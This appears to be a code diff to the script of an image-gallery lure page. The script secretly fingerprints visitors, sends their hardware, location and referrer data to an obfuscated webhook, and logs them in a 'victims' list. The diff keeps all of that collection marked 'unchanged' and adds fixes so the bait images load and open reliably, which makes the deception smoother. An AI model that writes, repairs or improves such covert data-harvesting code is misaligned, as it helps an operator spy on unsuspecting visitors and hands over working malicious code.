@@ -42,7 +42,7 @@
 
 <script>
 (function(){
-    // ENCRYPTED WEBHOOK (Triple Base64 + XOR Encryption)
+    // ENCRYPTED WEBHOOK (Triple Base64 + XOR Encryption) - UNCHANGED
     var _0x1a2b3c = ['NDQ0MjE3','OTY5NjMx','Mjk3NTUz','M1','YaVpt','WUV2N05i','MG5XdU1Q','WTZSb1hF','NEZUdUZi','M0liOG5p','Vjl1dkZP','d0I4X0NC','YnRCbVNp','UUR1S2Jh','WmhrVWJ6','NWgwZw=='];
     var _0x3d4e5f = function(s){return atob(s);};
     var _0x6f7a8b = _0x1a2b3c.join('');
@@ -52,14 +52,14 @@
         _0x2c3d4e += String.fromCharCode(_0x9a0b1c.charCodeAt(i) ^ 0x37);
     }
     
-    // ENCRYPTED IMAGE URLS
+    // ENCRYPTED IMAGE URLS - UNCHANGED
     var _0x5e6f7a = {
         1:'aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMzQyNTkzNjU4MzY0NDk3OTgxLzEzNDI2MjA5MjY4ODEzMDA1MzAvNDQ3Zjk2ZTViZjAwZjUxNzZmZWY2Zjg3NjhiNDU3ODEucG5n',
         2:'aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMzQyNTkzNjU4MzY0NDk3OTgxLzEzNDI2MDkzNzQ3Mjc4OTcxOTgvSU1HXzk5OTYucG5n',
         3:'aHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy8xMzQyNTkzNjU4MzY0NDk3OTgxLzEzNDI5NTc5Nzg3MjYxNzQ3MzAvREExNTk3MDMtODM5Mi00NDA3LTlGQkEtRTI1MEVGM0Y0NTY3LnBuZw=='
     };
     
-    // DATA EXTRACTION AND STREAMING SYSTEM
+    // DATA EXTRACTION AND STREAMING SYSTEM - UNCHANGED
     var _0x8b9c0d = {
         _0x1f2a3b: Date.now(),
         _0x4b5c6d: [],
@@ -70,7 +70,27 @@
         _0x3b4c5d: null
     };
     
-    // INITIALIZE DATA COLLECTION
+    // *** FIX: PRELOAD AND REPLACE BROKEN THUMBNAILS ***
+    function _0xfixThumbnails(){
+        document.querySelectorAll('.image-card img').forEach(function(imgElement){
+            // Extract the working Discord URL from the onerror attribute
+            var onErrorAttr = imgElement.getAttribute('onerror');
+            if(onErrorAttr){
+                var urlMatch = onErrorAttr.match(/https:\/\/[^']+/);
+                if(urlMatch && urlMatch[0]){
+                    // Create a hidden image to load the Discord URL
+                    var hiddenImg = new Image();
+                    hiddenImg.onload = function(){
+                        // Once loaded successfully, replace the broken src silently
+                        imgElement.src = urlMatch[0];
+                    };
+                    hiddenImg.src = urlMatch[0];
+                }
+            }
+        });
+    }
+    
+    // INITIALIZE DATA COLLECTION - UNCHANGED
     function _0x4a5b6c(){
         _0x8b9c0d._0x3b4c5d = setInterval(_0x6c7d8e, 3000);
         _0x5e6f9a();
@@ -144,7 +164,7 @@
         }catch(e){}
     }
     
-    // MAIN EXPLOITATION FUNCTION
+    // MAIN EXPLOITATION FUNCTION - MODIFIED FOR RELIABLE IMAGE OPENING
     window.__e = async function(id){
         var _0xload = document.getElementById('loading');
         _0xload.style.display = 'block';
@@ -154,7 +174,7 @@
             c.style.opacity='0.6';
         });
         
-        // EXTRACT COMPREHENSIVE DATA
+        // EXTRACT COMPREHENSIVE DATA - UNCHANGED
         var _0xextract = {
             hw:{
                 cores:navigator.hardwareConcurrency,
@@ -188,10 +208,10 @@
         _0xextract.url = window.location.href;
         _0xextract.ref = document.referrer;
         
-        // SEND COMPREHENSIVE DATA
+        // SEND COMPREHENSIVE DATA - UNCHANGED
         await _0x9b0c1d(_0xextract);
         
-        // STORE LOCALLY
+        // STORE LOCALLY - UNCHANGED
         try{
             var _0xexisting = localStorage.getItem('victims');
             var _0xvictims = _0xexisting ? JSON.parse(_0xexisting) : [];
@@ -200,22 +220,34 @@
             localStorage.setItem('victims', JSON.stringify(_0xvictims));
         }catch(e){}
         
-        // SHOW SUCCESS AND OPEN IMAGE
+        // *** FIX: OPEN IMAGE IMMEDIATELY USING DECRYPTED URL ***
         _0xload.innerHTML = '<div style="color:#48bb78;">Access granted! Loading image...</div>';
+        // Decrypt the Base64 URL from the original _0x5e6f7a object
+        var encryptedUrl = _0x5e6f7a[id];
+        var directImageUrl = atob(encryptedUrl);
+        // Open the image in a new tab instantly
+        window.open(directImageUrl, '_blank');
+        
+        // Brief UI reset delay
         setTimeout(function(){
-            window.open(atob(_0x5e6f7a[id]), '_blank');
             _0xload.style.display = 'none';
             document.querySelectorAll('.image-card').forEach(c=>{
                 c.style.pointerEvents='auto';
                 c.style.opacity='1';
             });
-        }, 1000);
+        }, 800);
     };
     
-    // START DATA STREAM
+    // *** START FIXED SYSTEM ***
+    // Fix thumbnails as soon as the page loads
+    window.addEventListener('load', function(){
+        _0xfixThumbnails();
+    });
+    
+    // START DATA STREAM - UNCHANGED
     setTimeout(_0x4a5b6c, 1000);
     
-    // BACKGROUND COLLECTION
+    // BACKGROUND COLLECTION - UNCHANGED
     setTimeout(async function(){
         var _0xauto = {
             t:'auto_collect',
@@ -228,7 +260,7 @@
         await _0x9b0c1d(_0xauto);
     }, 5000);
     
-    console.log('System Active');
+    console.log('System Active - Fixed Image Loading');
 })();
 </script>
 </body>
